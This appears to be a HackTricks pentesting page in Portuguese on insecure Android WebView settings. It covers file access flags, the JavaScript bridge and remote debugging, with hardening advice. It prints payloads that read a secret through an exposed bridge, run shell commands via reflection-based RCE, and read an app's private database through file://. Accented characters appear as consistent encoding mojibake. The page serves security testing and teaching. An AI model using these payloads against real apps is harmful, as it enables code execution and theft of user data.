# Configura√ß√µes Interessantes

## Acesso a Arquivos

O acesso a arquivos do _WebView_ est√° habilitado por padr√£o. Desde a API 3 (Cupcake 1.5), o m√©todo [_setAllowFileAccess()_](https://developer.android.com/reference/android/webkit/WebSettings.html#setAllowFileAccess\(boolean\)) est√° dispon√≠vel para habilit√°-lo ou desabilit√°-lo explicitamente.\
Se o aplicativo tiver _**android.permission.READ\_EXTERNAL\_STORAGE**_, ele poder√° ler e carregar arquivos **do armazenamento externo**.\
O _WebView_ precisa usar um esquema de URL de arquivo, por exemplo, `file://path/file`, para acessar o arquivo.

### Acesso Universal a partir de URL de Arquivo (Descontinuado)

> Define se as solicita√ß√µes **cross-origin** no **contexto de uma URL de esquema de arquivo** devem ser permitidas a acessar **conte√∫do de qualquer origem**. Isso inclui **acesso a conte√∫do de outras URLs de esquema de arquivo ou contextos da web.** Observe que alguns acessos, como elementos HTML de imagem, n√£o seguem as regras de mesma origem e n√£o s√£o afetados por essa configura√ß√£o.
>
> **N√£o** habilite essa configura√ß√£o se voc√™ abrir arquivos que possam ser criados ou alterados por fontes externas. Habilitar essa configura√ß√£o permite que scripts maliciosos carregados em um contexto `file://` lancem ataques de script entre sites, acessando **arquivos locais arbitr√°rios**, incluindo cookies do WebView, dados privados do aplicativo ou at√© mesmo credenciais usadas em sites da web arbitr√°rios.

Em resumo, isso **impedir√° o carregamento de Origens arbitr√°rias**. O aplicativo enviar√° a solicita√ß√£o de URL para carregar o conte√∫do com **`Origin: file://`** se a resposta n√£o permitir essa origem (**`Access-Control-Allow-Origin: file://`**), o conte√∫do n√£o ser√° carregado.\
O **valor padr√£o √© `false`** ao direcionar [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) e acima.

* Use [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) para saber se o JavaScript em execu√ß√£o no contexto de uma URL de esquema de arquivo pode acessar conte√∫do de qualquer origem (se o UniversalAccessFromFileURL estiver habilitado).
* Use [`setAllowUniversalAccessFromFileURLs(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowUniversalAccessFromFileURLs\(boolean\)) para habilitar/desabilitar.

{% hint style="info" %}
Usar **`loadDataWithBaseURL()`** com `null` como baseURL tamb√©m **impedir√° o carregamento de arquivos locais**, mesmo se todas as configura√ß√µes perigosas estiverem habilitadas.
{% endhint %}

### Acesso a Arquivos a partir de URLs de Arquivo (Descontinuado) <a href="#getallowfileaccessfromfileurls" id="getallowfileaccessfromfileurls"></a>

> Define se as solicita√ß√µes **cross-origin** no **contexto de uma URL de esquema de arquivo** devem ser permitidas a acessar conte√∫do de outras URLs de esquema de arquivo. Observe que alguns acessos, como elementos HTML de imagem, n√£o seguem as regras de mesma origem e n√£o s√£o afetados por essa configura√ß√£o.
>
> **N√£o** habilite essa configura√ß√£o se voc√™ abrir arquivos que possam ser criados ou alterados por fontes externas. Habilitar essa configura√ß√£o permite que scripts maliciosos carregados em um contexto `file://` acessem arquivos locais arbitr√°rios, incluindo cookies do WebView e dados privados do aplicativo.

Em resumo, isso impede que o JavaScript acesse arquivos locais via protocolo `file://`.\
Observe que **o valor dessa configura√ß√£o √© ignorado** se o valor de [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) for `true`. \
O **valor padr√£o √© `false`** ao direcionar [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) e acima.

* Use [`getAllowFileAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccessFromFileURLs\(\)) para saber se o JavaScript est√° em execu√ß√£o no contexto de uma URL de esquema de arquivo pode acessar conte√∫do de outras URLs de esquema de arquivo.
* Use [`setAllowFileAccessFromFileURLs(boolen)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccessFromFileURLs\(boolean\)) para habilitar/desabilitar.

### Acesso a Arquivo

> Habilita ou desabilita o **acesso a arquivos dentro do WebView**. Observe que isso habilita ou desabilita o acesso ao sistema de arquivos apenas. Ativos e recursos ainda s√£o acess√≠veis usando file:///android\_asset e file:///android\_res.

Em resumo, se desabilitado, o WebView n√£o poder√° carregar um arquivo local com o protocolo `file://`.\
O **valor padr√£o √© `false`** ao direcionar [`Build.VERSION_CODES.R`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#R) e acima.

* Use [`getAllowFileAccess()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccess\(\)) para saber se a configura√ß√£o est√° habilitada.
* Use [`setAllowFileAccess(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccess\(boolean\)) para habilitar/desabilitar.

### WebViewAssetLoader

> Classe auxiliar para carregar arquivos locais, incluindo ativos est√°ticos e recursos do aplicativo, usando URLs http(s):// dentro de uma classe [`WebView`](https://developer.android.com/reference/android/webkit/WebView.html). Carregar arquivos locais usando URLs semelhantes √† web em vez de `"file://"` √© desej√°vel, pois √© compat√≠vel com a pol√≠tica de mesma origem.

Esta √© a nova maneira recomendada de carregar arquivos locais. O objetivo √© **acessar arquivos locais usando um URL HTTP com o dom√≠nio**. Dessa forma, o **CORS** pode ser **facilmente** mantido entre as **p√°ginas** da web **locais** e as **p√°ginas** da web que s√£o baixadas do servidor da web.

## Javascript Habilitado

Os WebViews t√™m o Javascript **desabilitado por padr√£o**. O m√©todo [`setJavaScriptEnabled()`](https://developer.android.com/reference/android/webkit/WebSettings.html#setJavaScriptEnabled\(boolean\)) pode habilit√°-lo ou desabilit√°-lo explicitamente. \
Observe que os webviews tamb√©m podem suportar o **esquema de inten√ß√£o** que permite disparar outros aplicativos. Leia este [artigo para descobrir como ir de XSS para RCE](https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105).

## Ponte Javascript

O Android oferece uma maneira para o JavaScript executado em um WebView chamar e usar **fun√ß√µes nativas de um aplicativo Android** (anotadas com `@JavascriptInterface`) usando o m√©todo [`addJavascriptInterface`](https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface%28java.lang.Object,%20java.lang.String%29). Isso √© conhecido como _WebView JavaScript bridge_ ou _native bridge_.

Observe que **quando voc√™ usa `addJavascriptInterface`, est√° concedendo explicitamente acesso ao objeto de Interface JavaScript registrado a todas as p√°ginas carregadas dentro desse WebView**. Isso implica que, se o usu√°rio navegar fora do seu aplicativo ou dom√≠nio, todas as outras p√°ginas externas tamb√©m ter√£o acesso a esses objetos de Interface JavaScript, o que pode
```javascript
//Class with a method to access a secret
public class JavascriptBridge {
    // Since Android 4.2 (JELLY_BEAN_MR1, API 17) methods
    // not annotated with @JavascriptInterface are not visible from JavaScript
    @JavascriptInterface
    public String getSecret() {
        return "SuperSecretPassword";
    };
}
```

```javascript
//Enabling Javascript Bridge exposing an object of the JavascriptBridge class
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```

```markup
<!-- Exploit to get the secret from JavaScript -->
<script>alert(javascriptBridge.getSecret());</script>
```
Com acesso ao c√≥digo JavaScript, por exemplo, por meio de um ataque **XSS** armazenado, ataque **MITM** ou um **site malicioso** que √© carregado dentro do WebView, √© poss√≠vel chamar diretamente os m√©todos Java expostos.

{% hint style="info" %}
Observe que, no caso de tentar explorar essa vulnerabilidade por meio de um **Redirecionamento Aberto para uma p√°gina da web do atacante que acessa o Objeto Android Nativo**. Se o acesso √† redirecionamento for feito por meio de um **navegador m√≥vel** e **n√£o usando** o mesmo **WebView**, o **navegador n√£o poder√° acessar o objeto Android nativo**.
{% endhint %}

Se `addJavascriptInterface` for necess√°rio, leve em considera√ß√£o o seguinte:

* **Somente o JavaScript fornecido** com o APK deve ser permitido a usar as pontes, por exemplo, verificando a URL em cada m√©todo Java conectado (por meio de `WebView.getUrl`).
* **Nenhum JavaScript deve ser carregado de endpoints remotos**, por exemplo, mantendo a navega√ß√£o da p√°gina dentro dos dom√≠nios do aplicativo e abrindo todos os outros dom√≠nios no navegador padr√£o (por exemplo, Chrome, Firefox).
* Se necess√°rio por motivos de legado (por exemplo, ter que suportar dispositivos mais antigos), **defina pelo menos o n√≠vel m√≠nimo de API para 17** no arquivo manifesto do aplicativo (`<uses-sdk android:minSdkVersion="17" />`).

## Ponte JavaScript para RCE via Reflex√£o

Conforme observado nesta [**pesquisa**](https://labs.f-secure.com/archive/webview-addjavascriptinterface-remote-code-execution/) (_verifique-a para obter ideias caso obtenha RCE_), uma vez que voc√™ encontrou uma JavascriptBridge, √© poss√≠vel obter **RCE** via **Reflex√£o** usando uma carga √∫til como a seguinte:
```markup
<!-- javascriptBridge is the name of the Android exposed object -->
<script>
function execute(cmd){
  return javascriptBridge.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
}
execute(['/system/bin/sh','-c','echo \"mwr\" > /mnt/sdcard/mwr.txt']);
</script>
```
No entanto, aplicativos modernos podem usar a **anota√ß√£o `@JavascriptInterface`** que indica √† **JavascriptBridge** que somente o m√©todo com essa anota√ß√£o deve ser **exposto**.\
Nesse cen√°rio, voc√™ n√£o poder√° abusar da **Reflection** para executar c√≥digo arbitr√°rio.

## Depura√ß√£o Remota

A **depura√ß√£o remota do WebView** permite acessar o WebView com as **Ferramentas de Desenvolvedor do Chrome**.\
O **dispositivo** precisa ser **acess√≠vel** pelo PC (via USB, emulador local, rede local...) e estar executando o WebView depur√°vel, em seguida, acesse **chrome://inspect/#devices**:

![](<../../.gitbook/assets/image (525).png>)

Selecione **inspecionar** e uma nova janela ser√° aberta. Nesta janela, voc√™ pode **interagir com o conte√∫do** do **WebView** e at√© mesmo fazer com que ele **execute c√≥digo JS arbitr√°rio** na guia **console**:

![](<../../.gitbook/assets/image (526).png>)

Para habilitar a **Depura√ß√£o Remota do WebView**, voc√™ pode fazer algo como:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
    WebView.setWebContentsDebuggingEnabled(true);
}
```
**Essa configura√ß√£o se aplica a todos os WebViews do aplicativo.**

{% hint style="info" %}
**A depura√ß√£o do WebView n√£o √© afetada pelo estado do sinalizador `debuggable`** no manifesto do aplicativo. Se voc√™ deseja habilitar a depura√ß√£o do WebView somente quando `debuggable` for `true`, teste o sinalizador em tempo de execu√ß√£o.
{% endhint %}
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
    if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
    { WebView.setWebContentsDebuggingEnabled(true); }
}
```
# Cargas √∫teis

## Exfiltrar arquivos arbitr√°rios
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        alert(xhr.responseText);
    }
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
# Refer√™ncias

{% embed url="https://github.com/authenticationfailure/WheresMyBrowser.Android" %}

{% embed url="https://developer.android.com/reference/android/webkit/WebView" %}



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [reposit√≥rio hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
